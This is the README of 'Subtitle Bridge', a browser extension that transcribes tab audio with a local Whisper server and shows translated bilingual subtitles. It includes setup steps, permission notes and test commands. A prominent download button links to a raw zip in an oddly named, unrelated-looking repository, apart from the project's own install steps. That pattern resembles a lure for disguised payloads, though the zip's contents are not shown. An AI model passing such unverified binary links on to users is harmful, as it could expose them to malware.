# 字幕桥 · Subtitle Bridge 1.1

Chrome / Edge 视频翻译插件：**听视频声音 → Whisper 识别文字 → 翻译 → 双语字幕**，不要求网站自带字幕。另保留原有网页字幕翻译模式。

[下载完整安装包（扩展 + 本机识别服务）](https://github.com/Believer-x/Frist/raw/refs/heads/main/subtitle-bridge-full.zip)

## 下载与使用（听声模式）

1. 在本仓库点击 **Code → Download ZIP**，解压完整项目。`subtitle-bridge.zip` 仅包含浏览器扩展，本机识别服务请从完整项目获取。
2. 安装 **Python 3.10–3.12（64 位）**。Windows 双击 `server/start.bat`；macOS / Linux 在项目目录执行 `sh server/start.sh`。请保持服务窗口打开。首次启动会安装 Python 依赖并从 Hugging Face 下载 Whisper 多语言 `base` 模型，需要网络和数百 MB 空间。出现 `Application startup complete` 后服务才就绪。
3. 打开 `chrome://extensions`（Edge：`edge://extensions`），开启开发者模式，加载项目内的 **extension** 文件夹。升级旧版时替换文件后点击扩展「重新加载」，并刷新视频页面。
4. 播放网页视频，点击插件图标。字幕来源选择 **听声翻译**，识别服务默认 `http://127.0.0.1:8765`。选择目标语言和翻译服务，点击 **保存并应用**，允许访问该本机识别服务。
5. 点击 **开始听译当前标签页**。音频会按约 4 秒一段识别并翻译，存在分段、模型推理与网络延迟；不是无延迟的逐字同传。无需开启原字幕。
6. 点击 **停止** 或关闭总开关可停止采集。保存任意设置、刷新/跳转页面、关闭被采集标签页也会停止，需要手动重新开始。关闭插件弹窗不会自动停止正在进行的听译。

需要 Chrome / Edge 116+，浏览器允许加载未打包扩展和采集标签页音频。每次仅听译一个标签页；标签页内全部声音都会被识别（包含广告或多个视频）。普通 HTTP/HTTPS 网页可尝试使用，包括 iframe 内视频，因为音频来源为整个标签页。受保护的媒体、浏览器内部页面或管理员禁用采集的环境可能无法使用。识别误差、音乐、噪声和每 4 秒分段边界会影响结果。内置 VAD 与静音检测可减少空白识别，仍可能漏词或出现模型幻觉。

**识别服务必须运行在你的电脑上**：云端启动的 `127.0.0.1` 服务不能被你电脑的扩展访问。如果电脑较慢，可以先在启动前设置 `WHISPER_MODEL=tiny`；或把 `WHISPER_MODEL` 设置为已下载的 faster-whisper 模型目录。默认 CPU / int8，每次只处理一个请求；待处理队列仅保留最新一段，过旧音频会丢弃，无法保证完整逐句转录。当前不提供云端语音 API、不采集麦克风，也不转录画面硬字幕。

## 翻译服务

识别与翻译是两个步骤。本机 Whisper 只识别原语言文字；译文通过插件设置中的翻译服务生成：

- **Google 公共翻译**：默认，无需密钥；非正式接口，可能限流或受到地区网络限制，不保证可用性。
- **LibreTranslate / 自建服务**：填写 HTTPS 根地址或 `/translate` 地址，可选 API Key。仅支持 LibreTranslate POST JSON 协议；开发时允许本机 HTTP。需要另行启动相应翻译服务，不包含在 Whisper 服务中。

如不需要听声，将字幕来源改为 **读取网站已有字幕**，保存并开启播放器字幕即可，不需要 Python 服务。支持标准 HTML5 TextTrack；已加入 YouTube、B站、Netflix、Prime Video、Shaka、Video.js、DPlayer 网页字幕选择器，属于尽力适配，尚未逐站实测，网站改版可能导致失效。

## 隐私与权限

- 只有点击「开始听译」才采集标签页声音，不使用麦克风；识别服务连接检查失败不会开始采集。
- 默认音频仅发到本机 Whisper；如改为远程识别地址，音频会发给那个服务。识别文字发到选定翻译服务。没有音频落盘、字幕历史、广告、统计或分析代码。
- `tabCapture` 用于当前标签页音频，`offscreen` 保持音频处理，`activeTab` 确定当前网页，`storage` 保存设置。网页字幕模式的全站内容脚本读取字幕。识别与额外翻译服务访问权限按域名申请。
- 采集后会将音频重新输出到扬声器，保证用户继续听到视频声音。停止会关闭音轨、音频上下文并取消进行中的识别请求；已发往翻译服务的文字请求可能仍完成，结果不会重新显示。
- API Key 保存于扩展 `storage.local`，不云同步，但不是加密密钥库。仅向所选 LibreTranslate 服务发送，不跟随重定向。
- 本机服务默认只监听 `127.0.0.1:8765`，限制 WAV 格式、上传大小、时长和推理并发，并阻止普通网站 Origin。可设置 `SUBTITLE_BRIDGE_EXTENSION_ID` 进一步限制为指定扩展 ID。无 Origin 的本机命令行仍可访问；这不是公开部署的鉴权方案，请勿直接暴露到公网。

## 开发与验证

浏览器扩展无需构建，运行时无 npm 依赖。测试依赖 Node.js 20+、Chromium；字幕视频夹具使用 FFmpeg：

```sh
npm ci --cache /tmp/subtitle-bridge-npm-cache
npm test
npm run check
ffmpeg -hide_banner -loglevel error -f lavfi -i color=c=black:s=640x360:d=20 -an -c:v libvpx -b:v 60k /tmp/subtitle-bridge-fixture.webm -y
CHROMIUM_PATH=/usr/lib/chromium/chromium VIDEO_FIXTURE=/tmp/subtitle-bridge-fixture.webm node tests/browser.mjs
CHROMIUM_PATH=/usr/lib/chromium/chromium node tests/audio-browser.mjs
python3 -m venv .venv
.venv/bin/python -m pip install -r server/requirements-dev.txt
.venv/bin/python -m unittest discover -s tests -p 'test_*.py'
```

- 单元测试验证重采样、WAV 编码、地址校验、翻译协议及错误处理。
- `tests/browser.mjs` 执行真实字幕/设置/后台代码，Chrome API 被模拟。
- `tests/audio-browser.mjs` 在真实 Chromium 中执行 AudioWorklet、PCM/WAV、HTTP 识别请求、后台翻译和双语渲染，验证显式开始、释放音轨、停止后不上传以及未就绪服务拒绝。**音源使用合成振荡器代替 tabCapture，语音模型使用固定测试响应，不证明真实识别准确率。**
- Python 测试验证 WAV 校验、识别 API 合约和来源限制，使用替代模型，不下载 Whisper。
- 完整 MV3 扩展加载测试保留在 `tests/extension.mjs`；允许未打包扩展的机器可用同样的视频夹具运行。

当前云环境的管理员策略禁止加载未打包扩展；Google 域名、Hugging Face 模型下载与备用 Chromium 下载被网络策略阻止（403）。因此真实 tabCapture、真实 Whisper 推理、真实 Google 翻译和各视频网站兼容性尚未完成端到端实测。Python 依赖安装与模块导入可验证；这不等于模型已经就绪。请在本机按上述步骤完成模型下载与试用。

目录：`extension/` 浏览器插件，`server/` 本机 Whisper 服务，`tests/` 测试。
